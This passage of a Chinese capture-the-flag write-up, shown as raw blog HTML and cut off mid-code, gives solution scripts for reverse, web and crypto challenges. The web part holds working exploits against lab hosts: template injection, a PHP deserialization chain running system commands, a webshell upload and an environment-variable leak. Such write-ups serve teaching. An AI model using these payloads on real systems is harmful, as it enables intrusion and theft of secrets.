class="hljs-number">2</span>,  <span class="hljs-number">43</span>]<br><br><span class="hljs-built_in">dict</span> = &#123;&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-built_in">dict</span>[(<span class="hljs-number">23</span>*(i)+<span class="hljs-number">66</span>)&amp;<span class="hljs-number">0xff</span>]=i<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>)<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(msg),<span class="hljs-number">12</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        t=msg[ip:ip+<span class="hljs-number">12</span>]<br>        tmp=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t]<br>        data=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">4</span>):<br>            data.append(<span class="hljs-built_in">int</span>.from_bytes(tmp[i:i+<span class="hljs-number">4</span>],<span class="hljs-string">&quot;little&quot;</span>))<br>        get = data<br><br>        v23 = get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">4</span>] + v23<br>        v25 = (get[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">2</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">5</span>] ^ v25)<br>        data[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">2</span>] + v23<br>        v25 = (get[<span class="hljs-number">2</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">1</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">3</span>] ^ v25)<br>        data[<span class="hljs-number">1</span>] &amp;= <span class="hljs-number">0xffffffff</span><br><br><br>        v23 = get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">7</span><br>        v24 = rand[<span class="hljs-number">6</span>*j] + v23<br>        v25 = (get[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">15</span>) ^ (get[<span class="hljs-number">1</span>]&lt;&lt; <span class="hljs-number">10</span>) | <span class="hljs-number">3</span><br>        data[<span class="hljs-number">0</span>] -= v24 + (rand[<span class="hljs-number">6</span>*j+<span class="hljs-number">1</span>] ^ v25)<br>        data[<span class="hljs-number">0</span>]&amp;=<span class="hljs-number">0xffffffff</span><br><br><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            i1=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(data[item])[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;0&quot;</span>))][::-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                msg[ip+<span class="hljs-number">4</span>*item+i2]=<span class="hljs-built_in">dict</span>[i1[i2]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(msg))<br></code></pre></td></tr></table></figure><h2 id="bad-pe"><a href="#bad-pe" class="headerlink" title="bad_pe"></a>bad_pe</h2><p><img src="/mdimg/2023pcb/2.png"><br>这里有个异或0x23，对.ATOM段进行异或，可以恢复程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;bad_pe.exe&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>encode = data[<span class="hljs-number">0x2e00</span>:<span class="hljs-number">0x10c00</span>]<br>t = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encode)):<br>    t.append((encode[i]^<span class="hljs-number">0x23</span>)&amp;<span class="hljs-number">0xff</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.exe&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>        f.write(t[i].to_bytes(<span class="hljs-number">1</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023pcb/3.png"><br>rc4加密，调试找到密钥和密文即可<br><img src="/mdimg/2023pcb/4.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Tera"><a href="#Tera" class="headerlink" title="Tera"></a>Tera</h2><p><a href="https://blog.xinshijiededa.men/writeup/buaactf-2023/">https://blog.xinshijiededa.men/writeup/buaactf-2023/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> socks<br><br>url = <span class="hljs-string">&quot;http://172.10.0.3:8081/&quot;</span><br><br>string = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&quot;</span><br><br><span class="hljs-comment"># proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8081&quot;&#125;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:<br>    data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&#123;% set arr = [__tera_context] %&#125;</span><br><span class="hljs-string">&#123;% set f = get_env(name=&quot;fl&quot;~&quot;ag&quot;) %&#125;</span><br><span class="hljs-string">&#123;%- for char in __tera_context -%&#125;</span><br><span class="hljs-string">    &#123;%- if char == &#x27;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;&#x27; -%&#125;&quot;&quot;&quot;</span> + i + <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;%- else -%&#125;</span><br><span class="hljs-string">    &lt;</span><br><span class="hljs-string">    &#123;%- endif -%&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;&quot;&quot;&quot;</span><br>    res = requests.post(url=url, data=data)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Hacker</span>&#123;<br>    private $exp;<br>    private $cmd;<br><br>    public  function __toString()<br>    &#123;<br>        call_user_func(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">H</span><br>&#123;<br>    public $username=<span class="hljs-string">&quot;admin&quot;</span>;<br>    public function __destruct()<br>    &#123;<br>        $this-&gt;welcome();<br><br>    &#125;<br>    public  function welcome()<br>    &#123;<br>        echo <span class="hljs-string">&quot;welcome~ &quot;</span>.$this-&gt;username;<br>    &#125;<br>&#125;<br><br><br>$res=new H();<br>$rev = new Hacker();<br>$res-&gt;username=$rev;<br>echo serialize($res);<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://172.10.0.5:80/&quot;</span><br>dirs = <span class="hljs-string">&quot;abcdef1234567890&quot;</span><br>exp = <span class="hljs-string">&quot;glob://backdoor_&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dirs:<br>        tmp = exp + i + <span class="hljs-string">&quot;*.php&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>: tmp&#125;<br>        content = requests.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes!!!&quot;</span> <span class="hljs-keyword">in</span> content:<br>            exp = exp + i<br>            <span class="hljs-built_in">print</span>(exp)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=<span class="hljs-number">1</span>&amp;title[]=.php&amp;data[]=&lt;?php system(<span class="hljs-string">&#x27;tac /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape"></a>Escape</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">172.10</span><span class="hljs-number">.0</span><span class="hljs-number">.5</span>:<span class="hljs-number">10000</span>/?username=%7Bpasshash.__str__.__globals__%5Bapp%5D.wsgi_app.__globals__%5Bos%5D.environ%7D&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="SecretShare"><a href="#SecretShare" class="headerlink" title="SecretShare"></a>SecretShare</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python">res = <span class="hljs-string">&#x27;&#x27;&#x27;27322282703709511636610535806856853612612796524565963685352821215367702697670029638291472271242231649191714479260517868076984065989639273952206721225394449809512736309152963717666213669565294618889004878502587203292128915123582846437035618297859622373514552659661751919687138158714389205196365694996691846589 48569244180151557205855904296808011040310995626104180491157243372509052545941856322458676083637192423759673249488348244220016168699221727901608142636001227515271570470832957720323162015971262916929310707561503164723954043820660896942792324593262461443662124187475159194385198887788939215142063719188348359051</span><br><span class="hljs-string">91805670014258342004112051538515158497977951249015335208828337677065661825541672701641011001509677094927054079355384880161339840664535548572711525978354947655159331190183669338379535914171636373271711777662899462412133698069202075760175522929409084089926367963132890460921167025666146228784502671381146711019 399560428917764748532974912549579755263000603891290776423346071350694440330590365031312031331274402458285677563081638572382883720599282186196046608483533823720739712120092762382758124206813101015928952314835833408960456083078746116580899849811889743359253318716527623535224217277574914341453477162101109304521</span><br><span class="hljs-string">66920426958285786458658248767160362920977647430969423155679844462544037512659182174429654322739226216034435833627040279237803034255254749729584723025199164153117416758037930376665769001615518843769072788984118288795594844920830871790000441610452127329422157793240336858492947908675187651204641324347460068225 544937610110319318485732752819003299421900030583201619755186005418563198983178922830516722630658659738570688423587906326520697827239870483140381321035311084086872965680985895264808839131965351704781276541438910273061170401708989341983455583148675268945159916067944049744805262336310315984482684477033006734287</span><br><span class="hljs-string">5635003138990118507194506070175086831788576611651929217926664518872856396687497543355452282932759792957815071333069987192436081970967301109108636547955400620912244311244917063515500624803643902206301188548901042409824866123277584384961209855675044800618682367677428510425729333590673520619706804051348640739 216744037211012509915361607447276981890614637104708083303422302996997658600655325492799426696396129495740380030328486134561677905050895542824084902986133831827678164847190414920208201189028697970734101241668427915881431218718486605095651504942024880541330783245275847421981881418579001271393784051391703426641</span><br><span class="hljs-string">42911212495890251189243677773682023641022813626312578449123776026147091248993904833237700742589532896024024290404122897946672451644535270088285040557715419433742408043822628453894022912746599564701384030731888203683342200542550299021286164291609827209395613247858235556551967071480178477133096158123879827699 358625812085590413825860316781088505612223852757468112073999439178735803245018313087878704846077887688463179850461438873261474235563220723161414348183847290126780153336526214025645436877174640254582752642464699350692290355463838062957644227630261763964930791440438099097640358707938365934460765509770713422802</span><br><span class="hljs-string">76393649631519338646914577444953093042692772742019473672660460181129677128343169843350211463697634615281051117955282687134957585026912161500321667521577171255986824727912674810018184784281896427202094684250866650111325600908495879530295097533881586073569958225485019114664641193908557023741440163457101525203 329857997030576972729986815876777011654061886138716155424533348668225264710995265453134377944058890193085147694227229106567976594481366856016163332702128728982600129466565167735283489379015199424332093096162272256722421083932784837620468049877168507039726118947169347011547142986416984741443370137649949904461</span><br><span class="hljs-string">79331720524907914908041917436319036255433828287857696014126718015259444328868691897077115926451094233087906865422458137916362681754241848523015955481140065721679824678490152910531795497192050173146826300375546645932629884190392808650921115445830421927238985963684104496062702531620988113510613763043301631209 521812627987763620197812504899506910796946504850708570349667428211492401785051233252744740254058319678959842396710646375803470815528610618211136953181796072686187773678649762524131730689630306575027480171902373722358678386430941181209464823845330723780859962168995759134414896419704465387883718956885830089204</span><br><span class="hljs-string">34982047515239854027766260430773762615551551624040650169394931537920509836795394460680530502277933252344187876902284046236616780767724165813414385632503982500888235012434695560644146038269348824756839799255778718600829638272259933042402900324341026396868817418250681063616205184019449176410323763562609906256 620605218346899770429088593442355698411635752845778736545505196875522232769153705673917137123151382118878693457232039690080398947092819660645917999264381455940649845030563994094759265923737413658758514560434230280086651591011706752452769554749328591613510563389443179182520711924593818729897121279090347342924</span><br><span class="hljs-string">152419925215633402551037300484006425703951620959940334562270582763998688826301000834158083436618204487451531847804246279293440954881219913553470971941979760351736535195521294640333019382215259554425750740788262905693120027837778006639912907313405166887419201498400381605572044667968915799849914769886304855469 534016646028730727016209888504911167747835078463480349483097394578844831015450227232096300754745773717118904569821782762146568167060585024245190142726454552015507956174745334336178848983708347742569471390328051491668238788357493167057460607669219247924675410096486695085439718252206048534436114032676610106347</span><br><span class="hljs-string">7879488845815070796446980042322339499701160196159748256186513316298957679171765636643576866967308539398870809808590995575054707633585889782359230149070757943670854204408729244422811261494912348733104477093541158692065916137178255072991528458124264991587844119002172895462900656781795781239777162351236329010 88871679849011995091477347542680893996957786653924621705917895209560005458566552006873467270402185918706978818367798743110976595300781848502254399030378598802075501163781912730014790884964070072432678736909128727529050058640555516131888412874572332236693843543870582425734398659970857777429709921292338764056</span><br><span class="hljs-string">127514038284722450386599280575918286761060061225148526034466492640545892790142008459404252129894996614536417849770574953585543450549469396103606474736901175227788222676384874264401431651217507860669506781393523454290522077615631381023377385798837961138591946856445250933293025411868935836885350047926486897489 77024841353020037736072564671223528105040202905964518913084686725674447555778849580882283151820241410917813178127609045792603404416216635536183501218256797138848233777386900397758052436048023588018973775841429672943588531118120531410941119451112420484244073744860360930771612798228353879418110447613074103121</span><br><span class="hljs-string">73523397212562449962797322407800812476585158706372414597501601851658987192829920809491154804458216832212324494892234069944533082031068984251998442644045753330748501446440305199570609290581400456976816997103538669480916305434314437973807842397862244118575425198027445648296131215572682266387781847672276278105 358131172545144245017725954943677533669555698100417873957892816178502113778385580423968891034087567143540060215845324391804373505677355257229040486254496477702089813554705646138200115877254745085768546159462550014224359419574896275660358462631189412166193397952134507043404147073495973377634175173793168251233</span><br><span class="hljs-string">147348014782035263557672447461924770257688598176948741569841957313948631675235455168853571742962013610522674191595258437726941866803703946285611136667070559549648062172513441677274884328986422767953568184453855423313870118663236611714535321243624425127415452246621538957156768109051856015526921750034402814181 595636882372433751112400377321820719222073583356736222414778628384644623278463447644996314505722523949309416112422725194730843858188224367723911893838329601709038981556011159397788345709995936511801237268248578658463705897357408752571102163768839107050797667376601808299838509114230891979045461260911946415320</span><br><span class="hljs-string">107396275167806069862891568873373042687841775147343147252292584080352003252925523814251826627764872245643578589633919368796490434000761591564932634968812847926559005905574630301932715978159346119216934096015784765061798867698507880003720720252714582289061793936959096457352973294797409716470781535683208662390 395153432543738329086362624068574193255148332584492341243454102818775521905404929692387305225461869410602734064349062513722129355095148212452014041134124275764033437990333449975234478218955405224252839531173866658663372361601107447751367104423527019655871175001744848253584734158351726745551407103825286804486</span><br><span class="hljs-string">111553464316331929637928443274530253217732988900086332463018159619552721468104642096142476958790984335379754112570481423047457696400188847850295271972015619208861578167810076654492163584804626343101458265888573313262592215690879907819608901681957001286346406746245896172209892822686784252329450759497940157817 511651161619212591638982125008326295422605195202233521320827338823708335474320214987121320809834264020752488400694820412703895872293388034242395958165882000777796549830919064001864919411540442573874044781198129468230793584507078981976925332170577699344654086418908951152825866266645119298895702972413286583958</span><br><span class="hljs-string">152943203796417374728939496393486026220901654584673108139041097288333960510566510856084351323729904924640199712274885275910827036984793221821982353991291820643933058458639690879406578278096815789977814737418245161029735350306516366692394206323956675431185964629143452067819609148096407834611672577927865412392 601919715680710925447421076338078877766683489886991843150153117466383328925764100913643134608445665513170565014760605822708267601346612031986281277217875335899155526135282569237278337539198315798958944970975021604720637053079350115793916435033122479416157536224071649845398032404766802667331247026412465230897</span><br><span class="hljs-string">166939346435092804149361985966477026395490869535977170373479116381554623702088662590719710620315106535772321371981485114999353813392487182004380368980412304867141197881584179316802946420573712884869207029807032629508803275758495901655593573546020371363238621118513519707566850164838945538265367877703756561143 234820987787318061334406237477763453845428872967687650137534289159784627741552971152526376041477941966693305257682995443922827379938186523574311761092208293391813942996139561570362972331975732091581332378414745250571717259039007898729580445364373819332663464831222506646891337600543033325723536694430603794811</span><br><span class="hljs-string">26423433781831557303965218555715659459964805457875828323769054957811368313465747671809917056868138188812894920739462390440860614780050790166810205409831687879766298929374237068956851330280802672993787657036328401560347701569533751904003924033296103431436132762238032533631035466975563403490612905290747500034 564564388847953966153849841262670748320376369154008357907963983929690302350574296789978591185246923974920161797995189321841257011791368992972604074119872162539552292552362460968499190796503841035750507639233595470833894116053816701560762298879109510469040808411623441894361241720213857716595525048872499260906</span><br><span class="hljs-string">67047973882442026847054596043723251652019181826511387455752441275468608245799296406017022023236054643173589545621722148324431435563020855357273526765167504290556087855144498047600331414488129605467552541562176094510433084299150667280746009871632940612151871433089450237469253872190728223812058292760792048327 190023992656957817692909813007060815279103259429273681430127196398700351704377473750794054807013341268132331757606642253453911294388801612173064841530999650755116853772677649649669913317951539550313189351839325961495963700012333982508285993230904890545000476087981313109451079110864357972818329854737276461934</span><br><span class="hljs-string">105924866908333941056520542136279835222849349889633638544229314020165638653054683617844504431167584527725854457445810982830025832114705779346552001573819055283000133195971409988231558773967828820675125138322725072735898886865540351014422681184954059397593545246946913932272750078695992276555307091275819914167 590597067702351181983043135203878889479903130263737024839941242154123057325926009112777887235038694551309864253859910817785607380293492455212053557033975616644911248422981687394189486917578693691299595122658518879946708562394161159104748320544408107959224087679644857953504156164164979544525935685064483284685&#x27;&#x27;&#x27;</span><br>p = <span class="hljs-number">667548632459029899397299221540978856425474915828934339291333387574324630349258515018972045406265448494845331262999241448002076917383740651362641947814545076390796789402373579283727117618532504865966299599663825771187433223531022829811594806917984414530614469374596457149431218829297339079019894262229453357029</span><br>c = <span class="hljs-number">9658009093151541277762773618550582280013680172161026781649630205505443184765264518709081169475689440555639354980432557616120809346519461077355134139495745998317849357705381020225760061125236265304057301286196004542729553944161451832173970613915423841610378207266606500956362098150141825329354727367056070349148059780287916811442861961254066733726576151134458892613951223277692935141880749737598416235307087782001086096114978527447987308876878393763055893556123029990282534497668077854186604106027698257663251502775547705641708624619340185646943640576690633662704397191379303254341343433077302686466850600522990402912</span><br>N = <span class="hljs-number">11790604055677230214731474049594783873473779547159534481643303694816346271798870343160061559787963631020684982858033776446193418629055210874285696446209220404060653230407249409973790191858423402504530660556839353260629987853933304089439885784684686555554108157760445567974629355878575105480273451284714281430590737346099023372211403461861104391534461524711472734572409128196536805998116015230502045333769525693468193385557827209520108839913096017750428926467123493650506193757937746017474062985480713594474378324234033232933140389879312722642144536418253323908290256009510135710208223393009237664704631175216240376891</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_shift</span>(<span class="hljs-params">x, shift, <span class="hljs-built_in">type</span>, mask=<span class="hljs-number">0xffffffff</span>, nbit=<span class="hljs-number">32</span></span>):<br>    res = x<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit//shift):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_extract</span>(<span class="hljs-params">x</span>):<br>    x = inverse_shift(x, <span class="hljs-number">18</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    x = inverse_shift(x, <span class="hljs-number">15</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">4022730752</span>)<br>    x = inverse_shift(x,  <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">2636928640</span>)<br>    x = inverse_shift(x, <span class="hljs-number">11</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">x</span>):<br>    y = x<br>    y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>    y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>    y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>    <span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_twist</span>(<span class="hljs-params">cur</span>):<br>    high = <span class="hljs-number">0x80000000</span><br>    low = <span class="hljs-number">0x7fffffff</span><br>    mask = <span class="hljs-number">0x9908b0df</span><br>    state = cur<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">623</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        tmp = state[i]^state[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        <span class="hljs-comment"># recover highest bit</span><br>        res = tmp&amp;high<br>        <span class="hljs-comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span><br>        tmp = state[i-<span class="hljs-number">1</span>]^state[(i+<span class="hljs-number">396</span>)%<span class="hljs-number">624</span>]<br>        <span class="hljs-comment"># recover Y,tmp = Y</span><br>        <span class="hljs-keyword">if</span> tmp &amp; high == high:<br>            tmp ^= mask<br>            tmp &lt;&lt;= <span class="hljs-number">1</span><br>            tmp |= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tmp &lt;&lt;=<span class="hljs-number">1</span><br>        res |= (tmp)&amp;low<br>        state[i] = res<br>    <span class="hljs-keyword">return</span> state<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">state</span>):<br>    mt = state[:]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>        y = (mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>        mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br>        <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>            mt[i] = mt[i] ^ <span class="hljs-number">0x9908b0df</span><br>    <span class="hljs-keyword">return</span> mt<br><br>res = [[<span class="hljs-built_in">int</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> i.split()] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]<br>X = [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res]<br>out = <span 